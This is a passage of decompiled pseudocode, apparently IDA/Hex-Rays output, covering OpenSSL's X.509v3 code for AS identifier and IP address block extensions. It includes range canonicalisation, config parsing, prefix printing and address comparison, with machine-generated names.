      sub_42C4F0(*(void **)(*(_DWORD *)(v7 + 4) + 4));
      *(_DWORD *)(*(_DWORD *)(v7 + 4) + 4) = a4;
    }
    else
    {
      *(_DWORD *)result = 0;
      *(_DWORD *)(result + 4) = a3;
    }
    if ( !sub_4269B0(*(int **)(*(_DWORD *)v4 + 4), v7) )
      goto LABEL_19;
    return 1;
  }
  return result;
}

//----- (00450740) --------------------------------------------------------
int __usercall sub_450740@<eax>(_DWORD *a1@<ebx>, _DWORD *a2@<edi>, int *a3@<esi>)
{
  int result; // eax

  if ( !a3 || !a1 || !a2 )
    sub_417C70("assertion failed: aor != NULL && min != NULL && max != NULL", "crypto\\x509v3\\v3_asid.c", 238);
  result = *a3;
  if ( *a3 )
  {
    if ( !--result )
    {
      *a1 = *(_DWORD *)a3[1];
      result = *(_DWORD *)(a3[1] + 4);
      *a2 = result;
    }
  }
  else
  {
    *a1 = a3[1];
    *a2 = a3[1];
  }
  return result;
}

//----- (00450790) --------------------------------------------------------
int __cdecl sub_450790(_DWORD *Block)
{
  _DWORD *v2; // edi
  int *v3; // esi
  int *v4; // eax
  unsigned int *v5; // edi
  unsigned int *v6; // esi
  _DWORD *v7; // ebx
  int *v8; // esi
  void **v9; // eax
  unsigned int *v10; // eax
  int v11; // eax
  int *v12; // eax
  int *v14; // [esp-18h] [ebp-40h]
  unsigned int *v15; // [esp+8h] [ebp-20h]
  unsigned int *v16; // [esp+Ch] [ebp-1Ch] BYREF
  unsigned int *v17; // [esp+10h] [ebp-18h] BYREF
  _DWORD *v18; // [esp+14h] [ebp-14h] BYREF
  _DWORD *v19; // [esp+18h] [ebp-10h] BYREF
  int v20; // [esp+1Ch] [ebp-Ch]
  unsigned int *v21; // [esp+20h] [ebp-8h] BYREF
  _DWORD *v22; // [esp+24h] [ebp-4h] BYREF
  void **Blocka; // [esp+2Ch] [ebp+4h]

  v15 = 0;
  Blocka = 0;
  v20 = 0;
  if ( !Block || !*Block )
    return 1;
  if ( *Block != 1 || !sub_426A30(Block[1]) )
    return 0;
  v2 = 0;
  if ( sub_426A30(Block[1]) - 1 <= 0 )
  {
LABEL_17:
    v11 = sub_426A30(Block[1]);
    v12 = (int *)sub_426A40((int *)Block[1], v11 - 1);
    if ( !v12 || *v12 != 1 || (sub_450740(&v21, &v22, v12), sub_430F50(v21, v22) <= 0) )
      v20 = 1;
  }
  else
  {
    while ( 1 )
    {
      v3 = (int *)sub_426A40((int *)Block[1], (int)v2);
      v14 = (int *)Block[1];
      v22 = (_DWORD *)((char *)v2 + 1);
      v4 = (int *)sub_426A40(v14, (int)v2 + 1);
      v17 = 0;
      v18 = 0;
      v16 = 0;
      v19 = 0;
      v21 = (unsigned int *)v4;
      sub_450740(&v17, &v18, v3);
      sub_450740(&v16, &v19, (int *)v21);
      v5 = v16;
      v6 = v17;
      if ( sub_430F50(v17, v16) >= 0 )
        break;
      v7 = v18;
      if ( sub_430F50(v6, v18) > 0 || sub_430F50(v5, v19) > 0 )
        break;
      v8 = (int *)Blocka;
      if ( !Blocka )
      {
        v9 = (void **)sub_4168C0();
        Blocka = v9;
        if ( !v9 )
          goto LABEL_22;
        v8 = (int *)v9;
      }
      if ( !sub_4318D0((int)v7, (int)v8) || !sub_437FD0(v8, 1) || (v10 = sub_4318B0(v8, v15), (v15 = v10) == 0) )
      {
LABEL_22:
        sub_408310(34, 162, 65, (int)"crypto\\x509v3\\v3_asid.c", 302);
        break;
      }
      if ( sub_430F50(v10, v5) >= 0 )
        break;
      v2 = v22;
      if ( (int)v2 >= sub_426A30(Block[1]) - 1 )
        goto LABEL_17;
    }
  }
  sub_42C4F0(v15);
  sub_417060(Blocka);
  return v20;
}

//----- (004509B0) --------------------------------------------------------
int __cdecl sub_4509B0(_DWORD *a1)
{
  _DWORD *v1; // edi
  int *v2; // ebp
  int *v3; // eax
  unsigned int *v4; // edi
  unsigned int *v5; // esi
  unsigned int *v6; // ebx
  int *v7; // esi
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // edx
  int *v12; // eax
  int v13; // eax
  int *v14; // eax
  int v16; // [esp+8h] [ebp-28h]
  int v17; // [esp+Ch] [ebp-24h]
  _DWORD *v18; // [esp+10h] [ebp-20h] BYREF
  void *Block; // [esp+14h] [ebp-1Ch]
  unsigned int *v20; // [esp+18h] [ebp-18h] BYREF
  void *v21; // [esp+1Ch] [ebp-14h]
  unsigned int *v22; // [esp+20h] [ebp-10h] BYREF
  unsigned int *v23; // [esp+24h] [ebp-Ch] BYREF
  int *v24; // [esp+28h] [ebp-8h] BYREF
  int v25; // [esp+2Ch] [ebp-4h]

  v1 = a1;
  v21 = 0;
  Block = 0;
  v25 = 0;
  if ( !a1 || !*a1 )
    return 1;
  if ( *a1 == 1 && sub_426A30(a1[1]) )
  {
    sub_426A90(a1[1]);
    v16 = 0;
    if ( sub_426A30(a1[1]) - 1 > 0 )
    {
      v17 = 1;
      do
      {
        v2 = (int *)sub_426A40((int *)v1[1], v16);
        v3 = (int *)sub_426A40((int *)v1[1], v17);
        v20 = 0;
        v23 = 0;
        v22 = 0;
        v18 = 0;
        v24 = v3;
        sub_450740(&v20, &v23, v2);
        sub_450740(&v22, &v18, v24);
        v4 = v22;
        v5 = v20;
        if ( sub_430F50(v20, v22) > 0 )
          sub_417C70("assertion failed: ASN1_INTEGER_cmp(a_min, b_min) <= 0", "crypto\\x509v3\\v3_asid.c", 391);
        v6 = v23;
        if ( sub_430F50(v5, v23) > 0 || sub_430F50(v4, v18) > 0 )
          goto LABEL_37;
        if ( sub_430F50(v6, v4) >= 0 )
        {
          sub_408310(34, 161, 116, (int)"crypto\\x509v3\\v3_asid.c", 405);
          goto LABEL_37;
        }
        v7 = (int *)Block;
        if ( !Block )
        {
          v8 = sub_4168C0();
          Block = v8;
          if ( !v8 )
            goto LABEL_40;
          v7 = v8;
        }
        if ( !sub_4318D0((int)v6, (int)v7) || !sub_437FD0(v7, 1) || (v9 = sub_4318B0(v7, v21), (v21 = v9) == 0) )
        {
LABEL_40:
          sub_408310(34, 161, 65, (int)"crypto\\x509v3\\v3_asid.c", 418);
          goto LABEL_37;
        }
        if ( !sub_430F50(v9, v4) )
        {
          if ( *v2 )
          {
            if ( *v2 == 1 )
            {
              sub_42C4F0(*(void **)(v2[1] + 4));
              *(_DWORD *)(v2[1] + 4) = v18;
            }
          }
          else
          {
            v10 = sub_4133F0(8u);
            if ( !v10 )
            {
              sub_408310(34, 161, 65, (int)"crypto\\x509v3\\v3_asid.c", 431);
              goto LABEL_37;
            }
            v11 = v18;
            *v10 = v20;
            v10[1] = v11;
            *v2 = 1;
            v2[1] = (int)v10;
          }
          v12 = v24;
          if ( *v24 )
          {
            if ( *v24 == 1 )
              *(_DWORD *)(v24[1] + 4) = 0;
          }
          else
          {
            v24[1] = 0;
          }
          sub_450270((int)v12);
          sub_426960((int *)a1[1], v17);
          --v16;
          --v17;
        }
        ++v17;
        ++v16;
        v1 = a1;
      }
      while ( v16 < sub_426A30(a1[1]) - 1 );
    }
    v13 = sub_426A30(v1[1]);
    v14 = (int *)sub_426A40((int *)v1[1], v13 - 1);
    if ( v14 && *v14 == 1 )
    {
      sub_450740(&v23, &v24, v14);
      if ( sub_430F50(v23, v24) > 0 )
      {
LABEL_37:
        sub_42C4F0(v21);
        sub_417060((void **)Block);
        return v25;
      }
      v1 = a1;
    }
    if ( !sub_450790(v1) )
      sub_417C70("assertion failed: ASIdentifierChoice_is_canonical(choice)", "crypto\\x509v3\\v3_asid.c", 473);
    v25 = 1;
    goto LABEL_37;
  }
  sub_408310(34, 161, 116, (int)"crypto\\x509v3\\v3_asid.c", 366);
  return 0;
}

//----- (00450D30) --------------------------------------------------------
_DWORD **__cdecl sub_450D30(int a1, int a2, int *a3)
{
  int v4; // ebp
  int v5; // edi
  size_t v6; // ebp
  const char *v7; // eax
  size_t v8; // esi
  int v9; // eax
  size_t v10; // esi
  size_t v11; // esi
  size_t v12; // eax
  const char *v13; // ecx
  char *v14; // eax
  char *v15; // edi
  _DWORD *v16; // esi
  _DWORD **v17; // esi
  void *Block; // [esp+4h] [ebp-14h] BYREF
  _DWORD **v19; // [esp+8h] [ebp-10h]
  void *v20; // [esp+Ch] [ebp-Ch]
  int v21; // [esp+10h] [ebp-8h]
  int i; // [esp+14h] [ebp-4h]

  Block = 0;
  v20 = 0;
  v19 = (_DWORD **)sub_42FB20((int)&unk_50E530);
  if ( !v19 )
  {
    sub_408310(34, 163, 65, (int)"crypto\\x509v3\\v3_asid.c", 505);
    return 0;
  }
  v4 = 0;
  for ( i = 0; v4 < sub_426A30((int)a3); i = ++v4 )
  {
    v5 = sub_426A40(a3, v4);
    if ( sub_44D6A0(*(char **)(v5 + 4), "AS") )
    {
      if ( sub_44D6A0(*(char **)(v5 + 4), "RDI") )
      {
        sub_408310(34, 163, 115, (int)"crypto\\x509v3\\v3_asid.c", 522);
LABEL_34:
        sub_408610(6, "section:", *(_DWORD *)v5, ",name:", *(_DWORD *)(v5 + 4), ",value:", *(_DWORD *)(v5 + 8));
LABEL_23:
        sub_42FEF0((int)v19, (int)&unk_50E530);
        sub_42C4F0(Block);
        sub_42C4F0(v20);
        return 0;
      }
      v21 = 1;
    }
    else
    {
      v21 = 0;
    }
    if ( !strcmp(*(const char **)(v5 + 8), "inherit") )
    {
      if ( !sub_4505A0((int)v19, v21) )
      {
        sub_408310(34, 163, 165, (int)"crypto\\x509v3\\v3_asid.c", 534);
        goto LABEL_34;
      }
    }
    else
    {
      v6 = strspn(*(const char **)(v5 + 8), "0123456789");
      v7 = (const char *)(v6 + *(_DWORD *)(v5 + 8));
      if ( *v7 )
      {
        v8 = strspn(v7, " \t");
        v9 = *(_DWORD *)(v5 + 8);
        v10 = v6 + v8;
        if ( *(_BYTE *)(v9 + v10) != 45 )
        {
          sub_408310(34, 163, 162, (int)"crypto\\x509v3\\v3_asid.c", 550);
          goto LABEL_34;
        }
        v11 = strspn((const char *)(v10 + 1 + v9), " \t") + v10 + 1;
        v12 = strspn((const char *)(v11 + *(_DWORD *)(v5 + 8)), "0123456789");
        v13 = *(const char **)(v5 + 8);
        if ( v13[v11 + v12] )
        {
          sub_408310(34, 163, 163, (int)"crypto\\x509v3\\v3_asid.c", 559);
          goto LABEL_34;
        }
        v14 = (char *)sub_4247B0(v13);
        v15 = v14;
        if ( !v14 )
        {
          sub_408310(34, 163, 65, (int)"crypto\\x509v3\\v3_asid.c", 576);
          goto LABEL_23;
        }
        v14[v6] = 0;
        Block = sub_44D140(0, v14);
        v16 = sub_44D140(0, &v15[v11]);
        v20 = v16;
        sub_413490(v15);
        if ( !Block || !v16 )
        {
          sub_408310(34, 163, 65, (int)"crypto\\x509v3\\v3_asid.c", 584);
          goto LABEL_23;
        }
        if ( sub_430F50((unsigned int *)Block, v16) > 0 )
        {
          sub_408310(34, 163, 116, (int)"crypto\\x509v3\\v3_asid.c", 589);
          goto LABEL_23;
        }
      }
      else
      {
        if ( !sub_44D5C0(v5, &Block) )
        {
          sub_408310(34, 163, 65, (int)"crypto\\x509v3\\v3_asid.c", 570);
          goto LABEL_23;
        }
        v16 = v20;
      }
      if ( !sub_450620((int)v19, v21, (int)Block, (int)v16) )
      {
        sub_408310(34, 163, 65, (int)"crypto\\x509v3\\v3_asid.c", 594);
        goto LABEL_23;
      }
      v4 = i;
      v20 = 0;
      Block = 0;
    }
  }
  v17 = v19;
  if ( !sub_4509B0(*v19) || !sub_4509B0(v17[1]) )
    goto LABEL_23;
  return v17;
}

//----- (004510B0) --------------------------------------------------------
void *sub_4510B0()
{
  return &unk_50E950;
}

//----- (004510C0) --------------------------------------------------------
void *sub_4510C0()
{
  return &unk_50E994;
}

//----- (004510D0) --------------------------------------------------------
void *sub_4510D0()
{
  return &unk_50E9D8;
}

//----- (004510E0) --------------------------------------------------------
void *sub_4510E0()
{
  return &unk_50EA1C;
}

//----- (004510F0) --------------------------------------------------------
void *sub_4510F0()
{
  return &unk_50EA4C;
}

//----- (00451100) --------------------------------------------------------
void __cdecl sub_451100(int a1)
{
  sub_42FEF0(a1, (int)&unk_50E994);
}

//----- (00451120) --------------------------------------------------------
void __cdecl sub_451120(int a1)
{
  sub_42FEF0(a1, (int)&unk_50EA1C);
}

//----- (00451140) --------------------------------------------------------
int __cdecl sub_451140(int a1)
{
  if ( a1 == 1 )
    return _RTC_NumErrors_1();
  if ( a1 == 2 )
    return 16;
  return 0;
}

//----- (00451160) --------------------------------------------------------
int __usercall sub_451160@<eax>(int a1@<ecx>, unsigned __int8 a2@<bl>, char *a3@<edi>, int a4)
{
  int v5; // eax
  int v6; // eax
  int v7; // eax

  v5 = *(_DWORD *)a1;
  if ( *(int *)a1 < 0 || v5 > a4 )
    return 0;
  if ( v5 > 0 )
  {
    memcpy(a3, *(const void **)(a1 + 8), *(_DWORD *)a1);
    v6 = *(_DWORD *)(a1 + 12) & 7;
    if ( v6 )
    {
      v7 = 255 >> (8 - v6);
      if ( a2 )
        a3[*(_DWORD *)a1 - 1] |= v7;
      else
        a3[*(_DWORD *)a1 - 1] &= ~(_BYTE)v7;
    }
  }
  memset(&a3[*(_DWORD *)a1], a2, a4 - *(_DWORD *)a1);
  return 1;
}

//----- (004511E0) --------------------------------------------------------
int __fastcall sub_4511E0(int a1, unsigned __int8 a2, int a3, int *a4)
{
  int v5; // ecx
  int i; // esi
  const char *v7; // eax
  int j; // edi
  int v9; // esi
  const char *v10; // eax
  char v11[2]; // [esp+Ah] [ebp-16h]
  unsigned __int8 v12; // [esp+Ch] [ebp-14h] BYREF
  char v13[14]; // [esp+Dh] [ebp-13h]

  if ( *a4 < 0 )
    return 0;
  v5 = a1 - 1;
  if ( v5 )
  {
    if ( v5 != 1 )
    {
      for ( i = 0; i < *a4; ++i )
      {
        v7 = word_4F1980;
        if ( i <= 0 )
          v7 = byte_4F1291;
        sub_419190(a3, "%s%02x", v7, *(unsigned __int8 *)(a4[2] + i));
      }
      sub_419190(a3, "[%d]", a4[3] & 7);
      return 1;
    }
    if ( sub_451160((int)a4, a2, (char *)&v12, 16) )
    {
      for ( j = 16; j > 1; j -= 2 )
      {
        if ( v11[j + 1] )
          break;
        if ( v11[j] )
          break;
      }
      v9 = 0;
      if ( j <= 0 )
        goto LABEL_20;
      do
      {
        v10 = word_4F1980;
        if ( v9 >= 14 )
          v10 = byte_4F1291;
        sub_419190(a3, "%x%s", (unsigned __int8)v13[v9] | (v13[v9 - 1] << 8), v10);
        v9 += 2;
      }
      while ( v9 < j );
      if ( v9 < 16 )
LABEL_20:
        sub_4051D0(a3, (int)word_4F1980);
      if ( !v9 )
        sub_4051D0(a3, (int)word_4F1980);
      return 1;
    }
    return 0;
  }
  if ( !sub_451160((int)a4, a2, (char *)&v12, 4) )
    return 0;
  sub_419190(a3, "%d.%d.%d.%d", v12, (unsigned __int8)v13[0], (unsigned __int8)v13[1], (unsigned __int8)v13[2]);
  return 1;
}
// 4511E0: using guessed type char var_16[2];

//----- (00451380) --------------------------------------------------------
int __usercall sub_451380@<eax>(int a1@<edi>, int a2, int *a3, int a4)
{
  int v4; // ebx
  int v5; // esi

  v4 = 0;
  if ( sub_426A30((int)a3) <= 0 )
    return 1;
  while ( 1 )
  {
    v5 = sub_426A40(a3, v4);
    sub_419190(a1, "%*s", a2, byte_4F1291);
    if ( *(_DWORD *)v5 )
      break;
    if ( !sub_4511E0(a4, 0, a1, *(int **)(v5 + 4)) )
      return 0;
    sub_419190(a1, "/%d\n", 8 * **(_DWORD **)(v5 + 4) - (*(_DWORD *)(*(_DWORD *)(v5 + 4) + 12) & 7));
LABEL_9:
    if ( ++v4 >= sub_426A30((int)a3) )
      return 1;
  }
  if ( *(_DWORD *)v5 != 1 )
    goto LABEL_9;
  if ( sub_4511E0(a4, 0, a1, **(int ***)(v5 + 4)) )
  {
    sub_4051D0(a1, (int)"-");
    if ( sub_4511E0(a4, 0xFFu, a1, *(int **)(*(_DWORD *)(v5 + 4) + 4)) )
    {
      sub_4051D0(a1, (int)"\n");
      goto LABEL_9;
    }
  }
  return 0;
}

//----- (00451480) --------------------------------------------------------
int __cdecl sub_451480(int a1, int *a2, int a3, int a4)
{
  int **v4; // eax
  int **v5; // ebx
  int *v6; // eax
  int v7; // esi
  int v8; // eax
  int result; // eax
  int i; // [esp+10h] [ebp-4h]

  for ( i = 0; i < sub_426A30((int)a2); ++i )
  {
    v4 = (int **)sub_426A40(a2, i);
    v5 = v4;
    if ( v4 && (v6 = *v4, *v5) && v6[2] )
      v7 = *(unsigned __int8 *)(v6[2] + 1) | (*(unsigned __int8 *)v6[2] << 8);
    else
      v7 = 0;
    if ( v7 == 1 )
    {
      sub_419190(a3, "%*sIPv4", a4, byte_4F1291);
    }
    else if ( v7 == 2 )
    {
      sub_419190(a3, "%*sIPv6", a4, byte_4F1291);
    }
    else
    {
      sub_419190(a3, "%*sUnknown AFI %u", a4, byte_4F1291, v7);
    }
    if ( **v5 > 2 )
    {
      switch ( *(_BYTE *)((*v5)[2] + 2) )
      {
        case 1:
          sub_4051D0(a3, (int)" (Unicast)");
          break;
        case 2:
          sub_4051D0(a3, (int)" (Multicast)");
          break;
        case 3:
          sub_4051D0(a3, (int)" (Unicast/Multicast)");
          break;
        case 4:
          sub_4051D0(a3, (int)" (MPLS)");
          break;
        case 0x40:
          sub_4051D0(a3, (int)" (Tunnel)");
          break;
        case 0x41:
          sub_4051D0(a3, (int)" (VPLS)");
          break;
        case 0x42:
          sub_4051D0(a3, (int)" (BGP MDT)");
          break;
        case 0x80:
          sub_4051D0(a3, (int)" (MPLS-labeled VPN)");
          break;
        default:
          sub_419190(a3, " (Unknown SAFI %u)", *(unsigned __int8 *)((*v5)[2] + 2));
          break;
      }
    }
    v8 = *v5[1];
    if ( v8 )
    {
      if ( v8 == 1 )
      {
        sub_4051D0(a3, (int)":\n");
        result = sub_451380(a3, a4 + 2, (int *)v5[1][1], v7);
        if ( !result )
          return result;
      }
    }
    else
    {
      sub_4051D0(a3, (int)": inherit\n");
    }
  }
  return 1;
}

//----- (00451700) --------------------------------------------------------
int __fastcall sub_451700(_DWORD *a1, int *a2, int a3)
{
  int v4; // eax
  size_t **v5; // eax
  size_t *v6; // edi
  int v7; // esi
  int v8; // edi
  int v9; // eax
  int v10; // ebx
  int v11; // edi
  int v12; // ebx
  int v13; // eax
  int result; // eax
  unsigned int v15; // esi
  char *v16; // ecx
  char *v17; // edx
  int v18; // eax
  int v19; // [esp+10h] [ebp-30h]
  _DWORD *v20; // [esp+14h] [ebp-2Ch]
  int v21; // [esp+18h] [ebp-28h]
  char v22[16]; // [esp+1Ch] [ebp-24h] BYREF
  char v23[16]; // [esp+2Ch] [ebp-14h] BYREF

  v4 = *a2;
  v20 = a1;
  v21 = 0;
  v19 = 0;
  if ( v4 )
  {
    if ( v4 != 1 )
      goto LABEL_16;
    v5 = (size_t **)a2[1];
    v6 = *v5;
    v7 = **v5;
    if ( v7 < 0 || v7 > a3 )
      return -1;
    if ( v7 > 0 )
    {
      memcpy(v22, (const void *)v6[2], **v5);
      v8 = v6[3] & 7;
      if ( v8 )
        v22[v7 - 1] &= ~(255 >> (8 - v8));
    }
    memset(&v22[v7], 0, a3 - v7);
    v9 = 8 * a3;
  }
  else
  {
    v10 = a2[1];
    v11 = *(_DWORD *)v10;
    if ( *(int *)v10 < 0 || v11 > a3 )
      return -1;
    if ( v11 > 0 )
    {
      memcpy(v22, *(const void **)(v10 + 8), *(_DWORD *)v10);
      v12 = *(_DWORD *)(v10 + 12) & 7;
      if ( v12 )
        v22[v11 - 1] &= ~(255 >> (8 - v12));
    }
    memset(&v22[v11], 0, a3 - v11);
    v9 = 8 * *(_DWORD *)a2[1] - (*(_DWORD *)(a2[1] + 12) & 7);
  }
  a1 = v20;
  v21 = v9;
LABEL_16:
  if ( !*a1 )
  {
    if ( sub_451160(a1[1], 0, v23, a3) )
    {
      v13 = 8 * *(_DWORD *)v20[1] - (*(_DWORD *)(v20[1] + 12) & 7);
      goto LABEL_23;
    }
    return -1;
  }
  if ( *a1 != 1 )
    goto LABEL_24;
  if ( !sub_451160(*(_DWORD *)a1[1], 0, v23, a3) )
    return -1;
  v13 = 8 * a3;
LABEL_23:
  v19 = v13;
LABEL_24:
  v15 = a3;
  v16 = v23;
  v17 = v22;
  if ( (unsigned int)a3 < 4 )
  {
LABEL_27:
    if ( !v15 )
      goto LABEL_36;
  }
  else
  {
    while ( *(_DWORD *)v17 == *(_DWORD *)v16 )
    {
      v15 -= 4;
      v16 += 4;
      v17 += 4;
      if ( v15 < 4 )
        goto LABEL_27;
    }
  }
  v18 = (unsigned __int8)*v17 - (unsigned __int8)*v16;
  if ( v18 )
    goto LABEL_35;
  if ( v15 <= 1 )
    goto LABEL_36;
  v18 = (unsigned __int8)v17[1] - (unsigned __int8)v16[1];
  if ( v18 )
    goto LABEL_35;
  if ( v15 <= 2 )
    goto LABEL_36;
  v18 = (unsigned __int8)v17[2] - (unsigned __int8)v16[2];
  if ( v18 )
  {
LABEL_35:
    result = (v18 >> 31) | 1;
    goto LABEL_37;
  }
  if ( v15 > 3 )
  {
    v18 = (unsigned __int8)v17[3] - (unsigned __int8)v16[3];
    goto LABEL_35;
  }
LABEL_36:
  result = 0;
LABEL_37:
  if ( !result )
    return v21 - v19;
  return result;
}

//----- (00451920) --------------------------------------------------------
int __cdecl sub_451920(int **a1, _DWORD **a2)
{
  return sub_451700(*a2, *a1, 4);
}

//----- (00451940) --------------------------------------------------------
int __cdecl sub_451940(int **a1, _DWORD **a2)
{
  return sub_451700(*a2, *a1, 16);
}

//----- (00451960) --------------------------------------------------------
int __usercall sub_451960@<eax>(int a1@<edi>, unsigned __int8 *a2, unsigned __int8 *a3)
{
  unsigned __int8 *v3; // edx
  unsigned int v4; // esi
  unsigned __int8 *v5; // ecx
  int v6; // eax
  int v7; // edx
  unsigned __int8 *v8; // eax
  int v9; // eax
  unsigned __int8 *v10; // ecx
  unsigned __int8 v12; // al
  int v13; // esi
  unsigned __int8 v14; // [esp+10h] [ebp+4h]

  v3 = a2;
  v4 = a1;
  v5 = a3;
  if ( (unsigned int)a1 < 4 )
  {
LABEL_4:
    if ( !v4 )
      goto LABEL_14;
  }
  else
  {
    while ( *(_DWORD *)v3 == *(_DWORD *)v5 )
    {
      v4 -= 4;
      v5 += 4;
      v3 += 4;
      if ( v4 < 4 )
        goto LABEL_4;
    }
  }
  v6 = *v3 - *v5;
  if ( v6 )
    goto LABEL_12;
  if ( v4 > 1 )
  {
    v6 = v3[1] - v5[1];
    if ( v6 )
      goto LABEL_12;
    if ( v4 > 2 )
    {
      v6 = v3[2] - v5[2];
      if ( v6 )
        goto LABEL_12;
      if ( v4 > 3 )
      {
        v6 = v3[3] - v5[3];
LABEL_12:
        if ( ((v6 >> 31) | 1) > 0 )
          sub_417C70("assertion failed: memcmp(min, max, length) <= 0", "crypto\\x509v3\\v3_addr.c", 343);
      }
    }
  }
LABEL_14:
  v7 = 0;
  if ( a1 > 0 )
  {
    v8 = a3;
    do
    {
      if ( v8[a2 - a3] != *v8 )
        break;
      ++v7;
      ++v8;
    }
    while ( v7 < a1 );
  }
  v9 = a1 - 1;
  if ( a1 - 1 >= 0 )
  {
    v10 = &a3[v9];
    do
    {
      if ( v10[a2 - a3] )
        break;
      if ( *v10 != 0xFF )
        break;
      --v9;
      --v10;
    }
    while ( v9 >= 0 );
  }
  if ( v7 < v9 )
    return -1;
  if ( v7 > v9 )
    return 8 * v7;
  v12 = a2[v7] ^ a3[v7];
  v14 = a2[v7];
  switch ( v12 )
  {
    case 1u:
      v13 = 7;
      break;
    case 3u:
      v13 = 6;
      break;
    case 7u:
      v13 = 5;
      break;
    case 0xFu:
      v13 = 4;
      break;
    case 0x1Fu:
      v13 = 3;
      break;
    case 0x3Fu:
      v13 = 2;
      break;
    case 0x7Fu:
      v13 = 1;
      break;
    default:
      return -1;
  }
  if ( (v12 & v14) != 0 || (v12 & a3[v7]) != v12 )
    return -1;
  else
    return v13 + 8 * v7;
}

//----- (00451B50) --------------------------------------------------------
int __cdecl sub_451B50(int *a1, void *Src)
{
  int v2; // ecx
  int v3; // ebx
  int v4; // edi
  _DWORD *v5; // eax
  int v6; // esi
  bool v7; // zf
  _DWORD *v8; // eax
  _BYTE *v10; // eax

  v3 = (v2 + 7) / 8;
  v4 = v2 % 8;
  v5 = (_DWORD *)sub_42FB20((int)&unk_50E994);
  v6 = (int)v5;
  if ( !v5 )
    return 0;
  v7 = v5[1] == 0;
  *v5 = 0;
  if ( v7 && (v8 = sub_42C4E0(), (*(_DWORD *)(v6 + 4) = v8) == 0) || !sub_437A10(*(_DWORD *)(v6 + 4), Src, v3) )
  {
    sub_42FEF0(v6, (int)&unk_50E994);
    return 0;
  }
  *(_DWORD *)(*(_DWORD *)(v6 + 4) + 12) &= 0xFFFFFFF8;
  *(_DWORD *)(*(_DWORD *)(v6 + 4) + 12) |= 8u;
  if ( v4 > 0 )
  {
    v10 = (_BYTE *)(*(_DWORD *)(*(_DWORD *)(v6 + 4) + 8) + v3 - 1);
    *v10 &= ~(255 >> v4);
    *(_DWORD *)(*(_DWORD *)(v6 + 4) + 12) |= 8 - v4;
  }
  *a1 = v6;
  return 1;
}
// 451B55: variable 'v2' is possibly undefined

//----- (00451C10) --------------------------------------------------------
int __fastcall sub_451C10(int Size, char *Src, int *a3, unsigned __int8 *Srca)
{
  signed int v5; // edi
  int result; // eax
  int v7; // esi
  bool v8; // zf
  _DWORD *v9; // eax
  int *v10; // eax
  signed int i; // ebp
  int v12; // eax
  int v13; // ecx
  unsigned __int8 *v14; // ebx
  int v15; // ecx

  v5 = Size;
  if ( sub_451960(Size, (unsigned __int8 *)Src, Srca) >= 0 )
    return sub_451B50(a3, Src);
  result = sub_42FB20((int)&unk_50E994);
  v7 = result;
  if ( result )
  {
    v8 = *(_DWORD *)(result + 4) == 0;
    *(_DWORD *)result = 1;
    if ( !v8 )
      sub_417C70("assertion failed: aor->u.addressRange == NULL", "crypto\\x509v3\\v3_addr.c", 432);
    v9 = (_DWORD *)sub_42FB20((int)&unk_50E950);
    *(_DWORD *)(v7 + 4) = v9;
    if ( !v9 )
      goto LABEL_25;
    if ( !*v9 )
    {
      **(_DWORD **)(v7 + 4) = sub_42C4E0();
      if ( !**(_DWORD **)(v7 + 4) )
        goto LABEL_25;
    }
    v10 = *(int **)(v7 + 4);
    if ( !v10[1] )
    {
      *(_DWORD *)(*(_DWORD *)(v7 + 4) + 4) = sub_42C4E0();
      v10 = *(int **)(v7 + 4);
      if ( !v10[1] )
        goto LABEL_25;
    }
    for ( i = v5; i > 0; --i )
    {
      if ( Src[i - 1] )
        break;
    }
    if ( !sub_437A10(*v10, Src, i) )
      goto LABEL_25;
    *(_DWORD *)(**(_DWORD **)(v7 + 4) + 12) &= 0xFFFFFFF8;
    *(_DWORD *)(**(_DWORD **)(v7 + 4) + 12) |= 8u;
    if ( i > 0 )
    {
      v12 = (unsigned __int8)Src[i - 1];
      v13 = 1;
      if ( (v12 & 0x7F) != 0 )
      {
        do
          ++v13;
        while ( ((0xFFu >> v13) & v12) != 0 );
      }
      *(_DWORD *)(**(_DWORD **)(v7 + 4) + 12) |= 8 - v13;
    }
    if ( v5 <= 0 )
    {
      v14 = Srca;
    }
    else
    {
      do
      {
        v14 = Srca;
        if ( Srca[v5 - 1] != 0xFF )
          break;
        --v5;
      }
      while ( v5 > 0 );
    }
    if ( sub_437A10(*(_DWORD *)(*(_DWORD *)(v7 + 4) + 4), v14, v5) )
    {
      *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v7 + 4) + 4) + 12) &= 0xFFFFFFF8;
      *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v7 + 4) + 4) + 12) |= 8u;
      if ( v5 > 0 )
      {
        v15 = 1;
        if ( (v14[v5 - 1] & 0x7F) != 127 )
        {
          do
            ++v15;
          while ( ((0xFFu >> v15) & v14[v5 - 1]) != 0xFFu >> v15 );
        }
        *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(v7 + 4) + 4) + 12) |= 8 - v15;
      }
      *a3 = v7;
      return 1;
    }
    else
    {
LABEL_25:
      sub_42FEF0(v7, (int)&unk_50E994);
      return 0;
    }
  }
  return result;
}

//----- (00451DD0) --------------------------------------------------------
int *__cdecl sub_451DD0(int *a1, int Src)
{
  _BYTE *v2; // ecx
  char v3; // al
  size_t v4; // edi
  int v5; // ebx
  int v6; // ebp
  int v7; // esi
  int v8; // eax
  int *v9; // esi
  int v10; // eax
  _DWORD *v11; // eax

  v3 = Src;
  LOBYTE(Src) = BYTE1(Src);
  BYTE1(Src) = v3;
  if ( v2 )
  {
    BYTE2(Src) = *v2;
    v4 = 3;
  }
  else
  {
    v4 = 2;
  }
  v5 = 0;
  if ( sub_426A30((int)a1) <= 0 )
  {
LABEL_12:
    v8 = sub_42FB20((int)&unk_50EA1C);
    v9 = (int *)v8;
    if ( v8
      && (*(_DWORD *)(v8 + 4) || (v10 = sub_42FB20((int)&unk_50E9D8), (v9[1] = v10) != 0))
      && (*v9 || (v11 = sub_42C430(), (*v9 = (int)v11) != 0))
      && sub_437A10(*v9, &Src, v4)
      && sub_4269B0(a1, (int)v9) )
    {
      return v9;
    }
    else
    {
      sub_42FEF0((int)v9, (int)&unk_50EA1C);
      return 0;
    }
  }
  else
  {
    while ( 1 )
    {
      v6 = sub_426A40(a1, v5);
      if ( !*(_DWORD *)(*(_DWORD *)v6 + 8) )
        sub_417C70("assertion failed: f->addressFamily->data != NULL", "crypto\\x509v3\\v3_addr.c", 499);
      if ( **(_DWORD **)v6 == v4 )
      {
        v7 = *(_DWORD *)(*(_DWORD *)v6 + 8);
